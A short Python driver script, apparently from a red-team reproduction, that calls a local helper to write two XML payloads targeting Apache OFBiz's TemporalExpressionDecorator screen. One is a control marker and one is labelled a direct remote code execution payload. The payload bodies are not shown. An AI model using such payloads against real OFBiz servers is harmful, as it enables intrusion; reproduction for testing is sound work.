# -*- coding: utf-8 -*-
"""RT-2 步骤2 前置：写直连对照载荷（screen name=TemporalExpressionDecorator）。"""
import sys

sys.path.insert(0, "..")
from rt2_lib import xml_payload  # noqa: E402

print(xml_payload("TemporalExpressionDecorator", "pwn_rt2_ctl_marker",
                  "ofbiz_rt2_ctl.xml"))
print(xml_payload("TemporalExpressionDecorator", "pwn_rt2_direct_rce",
                  "ofbiz_rt2_direct.xml"))
